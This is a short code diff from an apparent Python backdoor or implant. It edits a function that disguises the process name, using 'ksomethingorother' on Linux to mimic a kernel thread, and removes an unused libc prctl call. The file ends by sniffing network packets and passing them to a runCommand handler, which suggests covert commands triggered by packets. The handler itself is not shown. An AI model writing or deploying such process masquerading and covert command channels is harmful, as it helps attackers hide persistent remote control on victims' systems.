@@ -43,20 +43,12 @@ def runCommand(packet):
 def setProcessName():
   operatingSystem = platform.system()
   procName = ""
-  libc = ""
   if operatingSystem == 'Darwin':
-    libc = cdll.LoadLibrary('libc.dylib')
     procName = "testtest"
   elif operatingSystem == "Linux":
     procName = "ksomethingorother"
-    libc = cdll.loadLibrary('libc.so.6')
 
   setproctitle.setproctitle(procName)
-
-  procNameBuf = create_string_buffer(len(procName) + 1)
-  procNameBuf.value = procName
-
-  # libc.prctl(15, byref(procNameBuf), 0, 0, 0)
 
 setProcessName()
 sniff(filter=sniffFilter, prn=runCommand)
